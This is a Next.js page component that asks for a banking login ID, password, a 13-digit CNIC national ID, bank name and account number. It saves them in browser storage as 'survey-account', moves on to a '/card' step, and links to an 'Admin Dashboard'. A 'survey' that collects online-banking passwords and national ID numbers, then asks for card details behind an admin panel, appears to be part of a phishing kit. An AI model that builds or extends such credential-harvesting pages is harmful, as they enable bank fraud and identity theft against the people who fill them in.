"use client";

import { useRouter } from "next/navigation";
import { useState } from "react";


export default function AccountPage() {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);

  const [data, setData] = useState({
    loginId: "",
    password: "",
    cnic: "",
    bankName: "",
    accountNumber: "",
  });

  const validate = () => {
    if (!data.loginId || !data.password || !data.cnic || !data.bankName || !data.accountNumber) {
      alert("All fields are required.");
      return false;
    }

    if (!/^\d{13}$/.test(data.cnic)) {
      alert("CNIC must be exactly 13 digits.");
      return false;
    }

    if (!/^\d+$/.test(data.accountNumber)) {
      alert("Account number must contain only digits.");
      return false;
    }

    return true;
  };

  const handleNext = () => {
    if (!validate()) return;
    localStorage.setItem("survey-account", JSON.stringify(data));
    router.push("/card");
  };

  return (
    <div className="p-6 max-w-xl mx-auto min-h-screen">
      <h1 className="text-3xl font-bold mb-6">Account Details</h1>

      <div className="grid gap-4">
        <input
          placeholder="Login ID"
          className="border p-3 rounded"
          value={data.loginId}
          onChange={(e) => setData({ ...data, loginId: e.target.value })}
        />

        <div className="relative">
          <div className="relative">
          <input
            placeholder="Password"
            type={showPassword ? "text" : "password"}
            className="border p-3 rounded w-full"
            value={data.password}
            onChange={(e) => setData({ ...data, password: e.target.value })}
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3 top-3 text-gray-500"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>
        </div>

        <input
          placeholder="CNIC (13 digits)"
          className="border p-3 rounded"
          maxLength={13}
          value={data.cnic}
          onChange={(e) => {
            if (/^\d*$/.test(e.target.value)) {
              setData({ ...data, cnic: e.target.value });
            }
          }}
        />

        <input
          placeholder="Bank Name"
          className="border p-3 rounded"
          value={data.bankName}
          onChange={(e) => setData({ ...data, bankName: e.target.value })}
        />

        <input
          placeholder="Account Number"
          className="border p-3 rounded"
          value={data.accountNumber}
          onChange={(e) => {
            if (/^\d*$/.test(e.target.value)) {
              setData({ ...data, accountNumber: e.target.value });
            }
          }}
        />

        <button
          onClick={handleNext}
          className="bg-blue-600 text-white p-3 rounded"
        >
          Next
        </button>
      </div>

        


  <div className="min-h-screen p-6 max-w-xl mx-auto flex flex-col">
  {/* Your form content */}
  <div className="space-y-4">
    {/* ...inputs and buttons... */}
  </div>

  {/* Footer with Admin link */}
  <footer className="mb-6 text-center">
    <a
      href="/admin"
      className="text-blue-600 hover:underline"
      target="_self"
      rel="noopener noreferrer"
    >
      Admin Dashboard
    </a>
  </footer>
</div>


    </div>
  );
}
